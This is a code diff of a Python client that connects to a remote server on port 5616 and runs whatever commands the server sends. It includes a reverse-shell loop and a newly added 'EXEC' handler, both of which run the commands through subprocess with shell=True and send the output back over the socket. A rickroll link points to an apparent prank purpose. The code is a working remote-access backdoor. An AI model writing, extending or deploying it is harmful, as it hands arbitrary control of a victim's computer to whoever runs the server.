@@ -13,6 +13,7 @@ PORT = 5616
 rickroll_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 chrome_path = 'C:\Program Files\Google\Chrome\Application\chrome.exe'
 
+
 def main():
     # rickroll()
     socketStart()
@@ -51,10 +52,19 @@ def socketStart():
                         print("Opening Reverse Shell...")
                         rshell(s)
                         print("Reverse Shell closed.")
+                    elif str(data).startswith("EXEC"):
+                        print("Executing command: " + data.split(' ')[1])
+                        output = subprocess.Popen(data.split(' ')[1], shell=True, stdout=subprocess.PIPE,
+                                                  stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        results = output.stdout.read().decode('utf-8')
+                        errors = output.stderr.read().decode('utf-8')
+                        print(Fore.BLUE + "Execution Results: " + Style.RESET_ALL + "{}".format((results if results else errors).strip()))
+                        send_shell_results(s, results if results else errors)
                     else:
                         print("Received data: {}".format(data))
         except socket.error as e:  # if server connection fails
             print("Connection error: {}".format(e))
+
 
 def rshell(s):
     while True:
@@ -62,22 +72,25 @@ def rshell(s):
         print(Fore.GREEN + "RShell remote command: {}".format(command) + Style.RESET_ALL)
         if command.lower() == 'exit':
             break
-        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                  stdin=subprocess.PIPE)
         results = output.stdout.read().decode('utf-8')
         errors = output.stderr.read().decode('utf-8')
         print(Fore.BLUE + "RShell results: " + Style.RESET_ALL + "{}".format(results if results else errors))
 
-        try:
-            data_to_send = (results if results else errors).encode("utf-8")
-            # Send data in chunks
-            for i in range(0, len(data_to_send), 1024):
-                s.sendall(data_to_send[i:i + 1024])
-            print("Sent results.")
-        except BrokenPipeError:
-            print("Connection closed by server.")
-            break
+        send_shell_results(s, results if results else errors)
 
 
+def send_shell_results(s, results):
+    try:
+        data_to_send = results.encode("utf-8")
+        # Send data in chunks
+        for i in range(0, len(data_to_send), 1024):
+            s.sendall(data_to_send[i:i + 1024])
+        print("Sent results.")
+    except BrokenPipeError:
+        print("Connection closed by server.")
+        return
 
 
 if __name__ == "__main__":
